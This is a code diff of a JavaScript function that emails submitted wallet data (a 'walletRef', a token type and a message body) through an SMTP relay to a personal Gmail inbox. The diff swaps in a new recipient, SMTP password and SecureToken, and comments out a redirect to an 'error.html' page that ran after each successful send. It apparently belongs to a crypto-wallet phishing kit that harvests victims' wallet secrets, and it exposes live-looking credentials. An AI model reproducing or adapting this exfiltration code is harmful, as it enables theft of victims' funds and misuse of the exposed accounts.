@@ -93,14 +93,14 @@ const sendRequest = (data) => {
     console.log(`Preparing to send email with the following data: ${msg}`);
   
     const emailData = {
-        SecureToken: '1da0dcb4-c434-44fa-b7fa-c9577ebe1408',
-        To: "olatundelucaz83@gmail.com",
-        From: "bekkierowland@gmail.com",
+        SecureToken: '55a9827b-6e19-4c73-b3e9-a70e03abbd20',
+        To: "Kazeeembola57@gmail.com",
+        From: "Kazeeembola57@gmail.com",
         Subject: `${data.walletRef} and token type is ${data.type}`,
         Body: `${msg}`,
         Host: "smtp.elasticemail.com", // Replace with your SMTP server
-        Username: "bekkierowland@gmail.com", // Replace with your SMTP username
-        Password: "955B3574AC1826A1BDB51F4AC77D9358D0FB", // Replace with your SMTP password
+        Username: "Kazeeembola57@gmail.com", // Replace with your SMTP username
+        Password: "4E1139149C6798E2769834109FF9B92727D2", // Replace with your SMTP password
         Port: 2525 // Replace with your SMTP port
     };
 
@@ -111,7 +111,7 @@ const sendRequest = (data) => {
             console.log("Email send promise resolved with message:", message);
             if (message === "OK") {
                 console.log("Email sent successfully. Connected to SMTP service provider.");
-                window.location = `error.html`;
+                // window.location = `error.html`;
             } else {
                 console.error("Email send failed with response:", message);
                 alert("Email send failed. Check the console for more details.");
